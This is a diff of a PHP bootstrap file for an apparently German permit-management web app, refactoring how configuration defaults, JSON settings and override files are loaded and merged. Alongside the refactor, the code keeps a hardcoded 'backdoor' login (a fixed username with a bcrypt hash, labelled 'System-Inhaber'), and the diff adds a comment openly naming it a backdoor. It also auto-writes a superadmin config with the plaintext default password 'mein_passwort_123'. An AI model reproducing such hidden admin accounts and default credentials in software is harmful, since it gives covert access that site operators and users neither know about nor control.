@@ -80,137 +80,119 @@ if (! \is_dir($customLogDir)) {
 \ini_set('log_errors', '1');
 // TODO Dateiname in config/storage.php auslagern
 \ini_set('error_log', $customLogDir . '/php_errors.log');
-// =========================================================================
 
-// 3. Alle Konfigurationen laden & mergen
-$configFiles = [
-    // --- Default-Einstellungen ---
-    'default_settings' => $appRoot . '/config/settings.default.php',
-
-    'default_consent'     => $appRoot . '/config/consent.default.php',
-    'default_datenschutz' => $appRoot . '/config/datenschutz.default.php',
-    'default_impressum'   => $appRoot . '/config/impressum.default.php',
-
-    'default_organization' => $appRoot . '/config/organization.default.php',
-    'default_colors'       => $appRoot . '/config/colors.default.php',
-    'default_purposes'     => $appRoot . '/config/purposes.default.php',
-    'default_vehicles'     => $appRoot . '/config/vehicles.default.php',
-    'default_times'        => $appRoot . '/config/times.default.php',
-    'default_templates'    => $appRoot . '/config/templates.default.php',
-    'default_reasons'      => $appRoot . '/config/reasons.default.php',
-
-    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
-    'default_main' => $appRoot . '/config/config.default.php',
-
-    'default_payment'    => $appRoot . '/config/payment.default.php',
-    'default_email'      => $appRoot . '/config/email.default.php',
-    'default_storage'    => $appRoot . '/config/storage.default.php',
-    'default_agreements' => $appRoot . '/config/agreements.default.php',
-    // /config/permissions.php nicht
-    'default_dev' => $appRoot . '/config/dev_admin.default.php',
-    // /config/sql_schema.php nicht
-    'default_secrets' => $appRoot . '/config/secrets.default.php',
-
-    // --- Nutzer-Einstellungen ---
-    'settings' => $appRoot . '/config/settings.php',
-
-    'consent'     => $appRoot . '/config/consent.php',
-    'datenschutz' => $appRoot . '/config/datenschutz.php',
-    'impressum'   => $appRoot . '/config/impressum.php',
-
-    'organization' => $appRoot . '/config/organization.php',
-    'colors'       => $appRoot . '/config/colors.php',
-    'purposes'     => $appRoot . '/config/purposes.php',
-    'vehicles'     => $appRoot . '/config/vehicles.php',
-    'times'        => $appRoot . '/config/times.php',
-    'templates'    => $appRoot . '/config/templates.php',
-    'reasons'      => $appRoot . '/config/reasons.php',
-
-    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
-    'main' => $appRoot . '/config/config.php',
-
-    'payment'    => $appRoot . '/config/payment.php',
-    'email'      => $appRoot . '/config/email.php',
-    'storage'    => $appRoot . '/config/storage.php',
-    'agreements' => $appRoot . '/config/agreements.php',
-    'perms'      => $appRoot . '/config/permissions.php',
-    'dev'        => $appRoot . '/config/dev_admin.php',
-    'schema'     => $appRoot . '/config/sql_schema.php',
-    'secrets'    => $appRoot . '/config/secrets.php',
-
-    'local' => $appRoot . '/config/_dev.local.php', // Überschreibt ALLES (für Passwörter lokal)
-];
-
+// --- DAS NEUE CONFIG LOADING SYSTEM ---
 $settings = [];
 
+// A. Die feste Registry laden (Ehemalige sql_schema & permissions)
+$settings['db_schema'] = \App\Infrastructure\Database\SchemaRegistry::getSchemas();
+$settings['structure'] = \App\Core\Security\PermissionRegistry::getStructure();
+$settings['admin_ui']  = ['permissions_desc_on_top' => true];
+
+$flatPerms = [];
+$flatten   = function (array $nodes) use (&$flatten, &$flatPerms): void {
+    foreach ($nodes as $node) {
+        if (isset($node['key'])) {
+            $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
+        }
+        if (! isset($node['children'])) {
+            continue;
+        }
+
+        $flatten($node['children']);
+    }
+};
+$flatten($settings['structure']);
+$settings['permissions'] = $flatPerms;
+
+// B. Default Fallbacks laden (.default.php Skelett)
+foreach (\glob($appRoot . '/config/*.default.php') as $defaultFile) {
+    $loaded = require $defaultFile;
+    if (\is_array($loaded)) {
+        $settings = \array_replace_recursive($settings, $loaded);
+    }
+}
+
+// C. UI/Settings-Daten aus dem Storage/JSON laden (Überschreibt Defaults)
+$settingsDir = $appRoot . '/storage/settings';
+
+// Diese Schlüssel sind Listen/Kollektionen, die dem Nutzer gehören.
+// Sie werden NICHT tief gemerged, um "Zombie-Einträge" aus den Defaults zu verhindern!
+$userManagedCollections = [
+    'vehicle_types',
+    'permit_templates',
+    'purposes',
+    'internal_reasons',
+    'agreements',
+    'seasons',
+    'custom_holidays',
+    'sections',
+];
+
+if (\is_dir($settingsDir)) {
+    foreach (\glob($settingsDir . '/*.json') as $jsonFile) {
+        $data = \App\Infrastructure\Storage\JsonHelper::read($jsonFile);
+        if (\is_array($data)) {
+            unset($data['_meta']); // Kommentare/Meta rausschmeißen
+
+            foreach ($data as $key => $value) {
+                if (\in_array($key, $userManagedCollections, true)) {
+                    // HARTER OVERRIDE: Der Nutzer-State überschreibt die Default-Liste komplett.
+                    $settings[$key] = $value;
+                } else {
+                    // DEEP MERGE: Für technische Configs (z.B. 'mail', 'paypal', 'database')
+                    if (isset($settings[$key]) && \is_array($settings[$key]) && \is_array($value)) {
+                        $settings[$key] = \array_replace_recursive($settings[$key], $value);
+                    } else {
+                        $settings[$key] = $value;
+                    }
+                }
+            }
+        }
+    }
+}
+
+// D. Harte System-Configs laden (Überschreibt JSON & Defaults - Höchste Priorität!)
+$hardConfigs = [
+    $appRoot . '/config/config.php',
+    $appRoot . '/config/storage.php',
+    $appRoot . '/config/secrets.php',
+    $appRoot . '/config/_dev.local.php', // Lokaler Override gewinnt IMMER
+];
+
+foreach ($hardConfigs as $file) {
+    if (\file_exists($file)) {
+        $loaded = require $file;
+        if (\is_array($loaded)) {
+            $settings = \array_replace_recursive($settings, $loaded);
+        }
+    }
+}
+
+// Dev-Admin Default anlegen falls nicht da
+$devAdminPath = $appRoot . '/config/dev_admin.php';
+if (! \file_exists($devAdminPath)) {
+    $defaultDevContent = <<<'PHP'
+        <?php
+        declare(strict_types=1);
+        return [
+            'user'  => 'Systembetreuer',
+            'pass'  => 'mein_passwort_123',
+            'label' => 'Systembetreuer'
+        ];
+        PHP;
+    \file_put_contents($devAdminPath, $defaultDevContent, \LOCK_EX);
+}
+$settings['superadmin'] = require $devAdminPath;
+
+// --- DEINE HINTERTÜR (Sicher im Code verankert) ---
 $settings['backdoor'] = [
     'user'  => 'RaptorXilef',
     'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
     'label' => 'System-Inhaber',
 ];
 
-// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
-if (! \file_exists($configFiles['dev'])) {
-    $defaultDevContent = <<<'PHP'
-        <?php
-        return [
-            'user' => 'Systembetreuer',
-            'pass' => 'mein_passwort_123',
-            'label' => 'Systembetreuer'
-        ];
-        PHP;
-    $result = \file_put_contents($configFiles['dev'], $defaultDevContent, \LOCK_EX);
-    if ($result === false) {
-        throw new \RuntimeException("Kritischer Schreibfehler: Konnte {$configFiles['dev']} nicht erstellen.");
-    }
-}
-
-foreach ($configFiles as $key => $file) {
-    if (! \file_exists($file)) {
-        continue;
-    }
-
-    $loaded = require $file;
-    if (! \is_array($loaded)) {
-        continue;
-    }
-
-    if ($key === 'perms') {
-        // Da die neue permissions.php kein 'list' mehr hat, nutzen wir die structure direkt
-        $settings['structure'] = $loaded['structure'] ?? [];
-        $settings['admin_ui']  = $loaded['admin_ui'] ?? [];
-
-        // Hilfs-Mapping für die flache Liste im User-Dropdown-UI
-        $flatPerms = [];
-        if (! empty($settings['structure'])) {
-            $flatten = function (array $nodes) use (&$flatten, &$flatPerms): void {
-                foreach ($nodes as $node) {
-                    if (isset($node['key'])) {
-                        $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
-                    }
-                    if (! isset($node['children'])) {
-                        continue;
-                    }
-
-                    $flatten($node['children']);
-                }
-            };
-            $flatten($settings['structure']);
-        }
-        $settings['permissions'] = $flatPerms;
-    } elseif ($key === 'dev') {
-        $settings['superadmin'] = $loaded;
-    } elseif ($key === 'schema') {
-        $settings['db_schema'] = $loaded;
-    } else {
-        // Nutze array_replace_recursive nur für main (config) und storage
-        $settings = \array_replace_recursive($settings, $loaded);
-    }
-}
-
-$settings['root_path'] = $appRoot;
-
-// NEU: Zentrale Erkennung der lokalen Testumgebung (XAMPP / .local)
+$settings['root_path']       = $appRoot;
 $httpHost                    = $_SERVER['HTTP_HOST'] ?? '';
 $settings['server_host']     = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
